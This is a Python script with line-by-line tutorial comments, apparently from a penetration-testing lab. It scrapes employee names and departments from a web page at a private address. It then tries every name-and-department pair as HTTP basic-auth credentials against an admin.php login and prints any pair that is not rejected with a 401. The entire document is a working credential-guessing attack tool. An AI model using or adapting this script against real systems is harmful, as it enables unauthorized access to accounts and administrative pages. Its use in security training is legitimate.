import requests
from bs4 import BeautifulSoup as bs4

def download_page(url):   #a string containing the URL will be the argument
    req = requests.get(url) #we assign the output of the "get" function from the "requests" module
    return req.content #the function will return the content of the page via the "response" variable

def find_names(response):   #web page content (server response) will be an argument to this function
    parser = bs4(response, 'html.parser') 
    # initialize BeautifulSoup module by referring to it as "bs4", with two arguments -- page content 
    # passed already to function and "html_parser". The initialized module will now be referred to as 
    # "parser" throughout the function.
    names = parser.find_all('td', id='name') 
    # we create a "names" variable and assign to it all elements of type "td" (rows of the table) that 
    # have an id attribute of "name". This function will return a list, so the variable name will now 
    # be a list of found names, but together with html markups like <td id=...
    output = []
    for name in names: #iterate over every element of the "names" list
        output.append(name.text) 
        #add pure text of the "names" element without html to the "output" list
    return output


#exactly the same will be done with the departments information:

def find_depts(response):
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='department')
    output = []
    for name in names:
        output.append(name.text)
    return output

def get_authorized(url, username, password):
    req = requests.get(url, auth=(username, password)) 
    # initialization of the GET request similar to getting page content, but this time it contains 
    # additional parameters of username and password that were passed to this function
    if str(req.status_code) != '401': 
        #if upon sending the request, the response code is not 401 (unauthorized) possibly we are 
        # authorized - then do the following:
        print ("\n[!] Username: " + username + " Password: " + password + " Code: " + str(req.status_code) + "\n") 
        #print username, password and the non-401 response code that was caused by using them

page = download_page("http://172.16.120.120") 
#we use the page URL in order to download content and we store it in the "page" variable

names = find_names(page) 
#assign a list of names retrieved from function "find_names" to the "names" variable
uniq_names = sorted(set(names))
#using function "sorted(set(names))" we extract unique names in case some are repeated

depts = find_depts(page) 
#assign a list of departments retrieved from function "find_depts" to the "depts" variable
uniq_depts = sorted(set(depts)) 
#using function "sorted(set(depts))" we extract unique department names in case some are repeated

print("[+] Working... ")
for name in uniq_names:
    for dept in uniq_depts: # nested loop - for each department in the list of unique departments

        get_authorized("http://172.16.120.120/admin.php", name, dept) 
        #issue an authentication request with every possible combination of name /department